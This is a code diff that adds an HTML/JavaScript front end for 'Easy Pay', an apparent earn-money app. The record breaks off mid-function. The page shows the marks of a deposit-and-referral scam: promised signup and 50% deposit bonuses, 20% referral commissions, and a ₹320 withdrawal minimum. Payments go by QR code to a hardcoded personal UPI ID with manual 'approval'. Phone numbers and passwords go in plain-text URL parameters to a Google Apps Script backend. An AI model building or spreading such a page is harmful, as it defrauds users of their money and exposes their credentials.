@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Pay - Earn ₹100 Daily</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --gold: #FFD700; --dark: #050505; }
+        body { background: var(--dark); color: white; font-family: sans-serif; }
+        .premium-card { background: linear-gradient(145deg, #1a1a1a, #0d0d0d); border: 1px solid #222; border-radius: 20px; }
+        .btn-gold { background: linear-gradient(90deg, #FFD700, #b8860b); color: black; font-weight: 800; border-radius: 12px; }
+        .tab-bar { background: #0a0a0a; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #333; z-index: 1000; }
+        .page { display: none; padding-bottom: 120px; animation: fadeIn 0.3s ease; }
+        .active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div id="auth-page" class="p-8 min-h-screen flex flex-col justify-center">
+        <div class="text-center mb-8">
+            <h1 class="text-5xl font-black text-yellow-500 italic uppercase">Easy Pay</h1>
+            <p class="text-xs text-zinc-500 mt-2 tracking-widest">GET ₹100 SIGNUP BONUS</p>
+        </div>
+        <div class="space-y-4 max-w-md mx-auto w-full">
+            <input type="number" id="phone" placeholder="Mobile Number" class="w-full p-4 rounded-xl bg-zinc-900 border border-zinc-800 text-white outline-none focus:border-yellow-500">
+            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-zinc-900 border border-zinc-800 text-white outline-none focus:border-yellow-500">
+            <input type="text" id="ref-code" placeholder="Refer Code (Optional)" class="w-full p-4 rounded-xl bg-zinc-900 border border-zinc-800 text-sm text-yellow-500">
+            <button id="auth-btn" onclick="handleAuth()" class="w-full btn-gold p-4 uppercase text-lg">Login / Register</button>
+        </div>
+    </div>
+
+    <div id="app-page" class="hidden">
+        <div id="home" class="page p-5 active">
+            <div class="bg-yellow-500 text-black p-2 rounded-lg mb-6 text-center font-bold text-[10px] uppercase">🚀 ₹100 Bonus Added! Deposit & Get 50% Extra</div>
+            <div class="premium-card p-8 mb-8 text-center border-b-4 border-yellow-500">
+                <p class="text-xs text-zinc-500 font-bold uppercase">Balance</p>
+                <h2 class="text-5xl font-black mt-2">₹<span id="bal">0.00</span></h2>
+                <div id="uid-disp" class="text-[10px] text-yellow-500 mt-3 font-mono">UID: LOADING...</div>
+            </div>
+            <div id="plans" class="space-y-4"></div>
+        </div>
+
+        <div id="refer" class="page p-5 text-center">
+            <h2 class="text-3xl font-black mb-6 mt-4 italic text-yellow-500">REFER & EARN</h2>
+            <div class="premium-card p-8 border-dashed border-yellow-500/50">
+                <div class="text-6xl mb-4">🎁</div>
+                <p class="text-sm text-zinc-400 mb-8 font-medium italic">Refer your friends and get 20% commission on their deposits!</p>
+                <button onclick="copyReferLink()" class="w-full btn-gold p-4 uppercase">Copy Invite Link</button>
+            </div>
+        </div>
+
+        <div id="withdraw" class="page p-5">
+            <h2 class="text-3xl font-black mb-6 mt-4 italic text-red-500">WITHDRAW</h2>
+            <div class="premium-card p-6 mb-8 border-l-4 border-red-500">
+                <p class="text-[10px] mb-4 text-zinc-500 uppercase font-bold">Minimum: ₹320</p>
+                <input type="number" id="w-amt" placeholder="Amount" class="w-full p-4 rounded-xl bg-black border border-zinc-800 text-white mb-4 outline-none">
+                <input type="text" id="w-upi" placeholder="UPI ID" class="w-full p-4 rounded-xl bg-black border border-zinc-800 text-white mb-4 outline-none">
+                <button onclick="submitReq('WITHDRAW')" class="w-full bg-red-600 text-white p-4 rounded-xl font-bold uppercase">Cash Out</button>
+            </div>
+            <div id="history-list" class="space-y-3"></div>
+        </div>
+    </div>
+
+    <div id="pay-modal" class="fixed inset-0 bg-black/95 hidden z-[2000] flex items-center justify-center p-6 backdrop-blur-sm">
+        <div class="premium-card p-8 w-full max-w-sm text-center">
+            <img id="qr" src="" class="w-48 h-48 mx-auto mb-4 bg-white p-2 rounded-xl">
+            <p class="text-3xl font-black text-white" id="p-amt">₹0</p>
+            <p class="text-xs text-yellow-500 mb-6 font-bold">+50% BONUS INCLUDED</p>
+            <input type="number" id="utr" placeholder="12 Digit UTR Number" class="w-full p-4 rounded-xl bg-black border border-zinc-800 mb-4 text-center text-white tracking-widest">
+            <button onclick="submitReq('PAYMENT')" class="w-full btn-gold p-4 font-black">SUBMIT UTR</button>
+            <button onclick="document.getElementById('pay-modal').classList.add('hidden')" class="mt-4 text-zinc-600 text-xs uppercase underline">Back</button>
+        </div>
+    </div>
+
+    <div id="nav" class="tab-bar hidden">
+        <button onclick="showPage('home')" class="text-zinc-500 focus:text-yellow-500 text-center">
+            <i class="fas fa-home text-xl block"></i><span class="text-[9px] uppercase font-bold">Home</span>
+        </button>
+        <button onclick="showPage('refer')" class="text-zinc-500 focus:text-yellow-500 text-center">
+            <i class="fas fa-gift text-xl block"></i><span class="text-[9px] uppercase font-bold">Refer</span>
+        </button>
+        <button onclick="showPage('withdraw')" class="text-zinc-500 focus:text-yellow-500 text-center">
+            <i class="fas fa-history text-xl block"></i><span class="text-[9px] uppercase font-bold">History</span>
+        </button>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzwa5iW5F8O4U9aeI_yFM_5HEjlymcdTG71j_IadZs8UXNizEHTQ4oT2iWn92arzjg2/exec";
+        const MY_UPI_ID = "6204977944@ptsbi";
+        let selectedAmt = 0;
+
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            if(params.get('ref')) document.getElementById('ref-code').value = params.get('ref');
+            const ph = localStorage.getItem('ep_phone');
+            if(ph) { 
+                document.getElementById('auth-page').classList.add('hidden');
+                document.getElementById('app-page').classList.remove('hidden');
+                document.getElementById('nav').classList.remove('hidden');
+                syncData(ph); 
+                renderPlans(); 
+            }
+        };
+
+        async function handleAuth() {
+            const ph = document.getElementById('phone').value;
+            const pw = document.getElementById('pass').value;
+            const rc = document.getElementById('ref-code').value || 'direct';
+            if(ph.length < 10) return alert("Sahi number daalein!");
+            
+            document.getElementById('auth-btn').innerText = "Processing...";
+            const url = `${SCRIPT_URL}?action=auth&phone=${ph}&password=${pw}&uid=EP${Math.floor(Math.random()*9999)}&referred_by=${rc}`;
+            
+            const res = await fetch(url);
+            const result = await res.json();
+
+            if(result.status === 'wrong_password') {
+                alert("Galat Password!");
+                document.getElementById('auth-btn').innerText = "Login / Register";
+            } else {
+                if(result.status === 'reg_success') alert("🎉 Welcome! ₹100 Bonus Added.");
+                localStorage.setItem('ep_phone', ph);
+                location.reload();
+            }
+        }
+
+        async function syncData(ph) {
+            try {
+                const res = await fetch(`${SCRIPT_URL}?action=get_data&phone=${ph}`);
+                const data = await res.json();
+                document.getElementById('bal').innerText = data.balance.toFixed(2);
+                document.getElementById('uid-disp').innerText = 'UID: ' + data.uid;
+            } catch(e) {}
+        }
+
+        function renderPlans() {
+            const p = [299, 500, 1000, 5000];
+            const container = document.getElementById('plans');
+            container.innerHTML = '';
+            p.forEach(amt => {
+                container.innerHTML += `<div class="premium-card p-5 flex justify-between items-center mb-3"><div><h4 class="font-black">₹${amt} Plan</h4><p class="text-[9px] text-yellow-500 font-bold uppercase tracking-widest">+₹${amt*0.5} Bonus</p></div><button onclick="openPay(${amt})" class="btn-gold px-6 py-2 text-xs">DEPOSIT</button></div>`;
+            });
+        }
+
+        function openPay(amt) {
+            selectedAmt = amt;
+            document.getElementById('p-amt').innerText = '₹' + amt;
+            document.getElementById('qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=${MY_UPI_ID}%26pn=EasyPay%26am=${amt}%26cu=INR`;
+            document.getElementById('pay-modal').classList.remove('hidden');
+        }
+
+        async function submitReq(type) {
+            const val = type === 'PAYMENT' ? document.getElementById('utr').value : document.getElementById('w-upi').value;
+            let amt = type === 'PAYMENT' ? (selectedAmt * 1.5) : document.getElementById('w-amt').value;
+            if(!val) return alert("Fill all details!");
+            
+            const url = `${SCRIPT_URL}?action=submit_req&phone=${localStorage.getItem('ep_phone')}&amount=${amt}&id_data=${val}&type=${type}`;
+            fetch(url, {mode: 'no-cors'});
+            alert("Sent! Please wait for approval.");
+            location.reload();
+        }
+
+        async function loadHistory() {
+            const res = await fetch(`${SCRIPT_URL}?action=get_history&phone=${localStorage.getItem('ep_phone')}`);
+            const history = await res.json();
+            const list = document.getElementById('history-list');
+            list.innerHTML = '';
+            history.forEach(item => {
+                let color = item.status.toLowerCase()
